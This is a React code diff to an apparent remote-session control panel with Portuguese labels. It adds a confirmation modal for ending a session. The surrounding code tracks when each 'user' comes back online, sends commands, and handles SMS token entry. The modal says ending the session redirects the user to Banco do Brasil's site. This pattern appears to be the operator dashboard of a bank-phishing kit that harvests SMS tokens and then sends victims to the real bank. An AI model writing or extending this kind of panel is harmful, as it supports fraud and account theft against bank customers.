@@ -543,6 +543,7 @@ function SessionBlock({
   const [smsOpen, setSmsOpen] = useState(false);
   const [smsDigits, setSmsDigits] = useState('');
   const [smsSent, setSmsSent] = useState<string | null>(null);
+  const [endOpen, setEndOpen] = useState(false);
   // Alerta de retorno: pulsa o card quando o usuário volta a ficar Online.
   const [returned, setReturned] = useState(false);
   const prevOnline = useRef(online);
@@ -676,11 +677,7 @@ function SessionBlock({
               type="button"
               className="donas-cmd-btn donas-cmd-btn--danger"
               disabled={ended}
-              onClick={() => {
-                if (window.confirm('Encerrar esta sessão? Esta ação inativa apenas esta sessão.')) {
-                  onCommand(session.id, 'end');
-                }
-              }}
+              onClick={() => setEndOpen(true)}
               data-testid="session-cmd-end"
             >
               Encerrar
@@ -762,6 +759,58 @@ function SessionBlock({
                 data-testid="sms-token-confirm"
               >
                 {smsSent ? 'Reenviar' : 'Confirmar'}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {endOpen && (
+        <div
+          className="donas-modal-backdrop"
+          onClick={() => setEndOpen(false)}
+          data-testid="end-session-modal"
+        >
+          <div className="donas-modal donas-modal--sm" onClick={(e) => e.stopPropagation()}>
+            <div className="donas-modal-head">
+              <h3>● Encerrar sessão</h3>
+              <button
+                type="button"
+                onClick={() => setEndOpen(false)}
+                aria-label="Fechar"
+                data-testid="end-session-close"
+              >
+                ×
+              </button>
+            </div>
+            <div className="donas-modal-body" style={{ display: 'block' }}>
+              <p style={{ margin: 0, fontSize: 14, lineHeight: 1.5, color: '#cdd3f5' }}>
+                Tem certeza que deseja <b>encerrar esta sessão</b>?
+              </p>
+              <p style={{ margin: '10px 0 0', fontSize: 13, lineHeight: 1.5, color: '#8b90a6' }}>
+                O usuário desta sessão será redirecionado para o site do Banco do Brasil
+                (bb.com.br). Esta ação afeta somente este card.
+              </p>
+            </div>
+            <div className="donas-modal-foot" style={{ gap: 10 }}>
+              <button
+                type="button"
+                className="donas-tool-btn"
+                onClick={() => setEndOpen(false)}
+                data-testid="end-session-cancel"
+              >
+                Cancelar
+              </button>
+              <button
+                type="button"
+                className="donas-submit donas-submit--sm donas-submit--danger"
+                onClick={() => {
+                  onCommand(session.id, 'end');
+                  setEndOpen(false);
+                }}
+                data-testid="end-session-confirm"
+              >
+                Encerrar sessão
               </button>
             </div>
           </div>
